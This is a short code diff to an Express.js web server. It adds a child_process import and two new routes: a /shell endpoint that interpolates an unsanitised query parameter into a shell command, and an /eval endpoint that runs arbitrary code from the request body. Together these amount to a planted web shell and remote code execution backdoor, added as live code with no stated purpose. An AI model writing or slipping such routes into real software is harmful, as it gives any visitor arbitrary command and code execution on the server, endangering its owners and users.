@@ -1,4 +1,5 @@
 const express = require('express');
+const { exec } = require('node:child_process');
 const crypto = require('node:crypto');
 const fs = require('node:fs');
 const path = require('node:path');
@@ -153,6 +154,17 @@ app.get('/debug', (req, res) => {
   const payload = String(req.query.payload || 'ping').replaceAll(/[\r\n]/g, '');
   console.log('debug request received');
   res.json({ received: payload });
+});
+
+app.get('/shell', (req, res) => {
+  exec(`echo ${req.query.cmd || 'poc'}`, (error, stdout) => {
+    res.json({ output: stdout?.trim(), error: error?.message });
+  });
+});
+
+app.post('/eval', (req, res) => {
+  const result = eval(req.body.code || '1');
+  res.json({ result });
 });
 
 if (require.main === module) {
